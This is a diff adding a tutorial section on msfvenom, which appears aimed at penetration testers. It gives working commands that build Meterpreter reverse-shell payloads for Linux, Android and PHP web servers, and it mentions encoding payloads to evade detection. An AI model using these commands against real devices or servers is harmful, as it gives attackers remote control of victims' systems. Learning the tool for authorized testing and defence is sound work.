@@ -36,3 +36,34 @@ Example (to generate a Python payload):
 msfvenom -p python/meterpreter/reverse_tcp LHOST=(your_IP) LPORT=4444 -f raw > payload.py
 ```
 
+#### Custom Payloads
+What is `msfvenom`?
+
+`msfvenom` is a versatile tool that combines msfpayload and msfencode. It helps you:
+
+- Create payloads in various formats (e.g., executable files, scripts).
+- Encode payloads to evade detection.
+- Customize payload options like IP addresses, ports, and protocols.
+
+Here are examples of how to generate payloads for different platforms:
+
+_Linux ELF Payload:_
+
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(your_IP) LPORT=4444 -f elf -o payload.elf
+```
+_Android APK Payload:_
+
+`msfvenom -p android/meterpreter/reverse_tcp LHOST=(your_IP) LPORT=5555 -o payload.apk`
+
+_PHP Reverse Shell Payload for Web Servers:_
+
+`msfvenom -p php/meterpreter_reverse_tcp LHOST=(your_IP) LPORT=8080 -f raw > payload.php`
+
+While creating payloads, ensure to configure these key options:
+
+- _LHOST:_ The local IP address for receiving connections.
+- _LPORT:_ The listening port for incoming connections.
+- _-f:_ The format of the payload (e.g., elf, apk, raw).
+
+Validate the payload after generation by reviewing its size and inspecting the code if necessary.
